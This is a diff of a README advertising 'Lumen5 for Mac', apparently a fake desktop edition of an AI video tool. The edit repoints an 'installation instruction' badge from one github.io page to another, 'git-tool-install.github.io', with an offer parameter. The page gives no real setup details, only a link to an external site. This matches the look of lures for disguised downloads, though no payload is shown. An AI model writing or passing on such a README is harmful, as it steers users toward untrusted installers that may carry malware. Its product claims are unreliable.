@@ -4,7 +4,7 @@
 Lumen5 for Mac brings AI-powered video creation directly to your desktop.  
 This application allows MacBook and iMac users to transform text, blogs, and articles into engaging videos with just a few clicks. ✨  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://muffinsun2005.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=Lumen5)
 
 ---
 
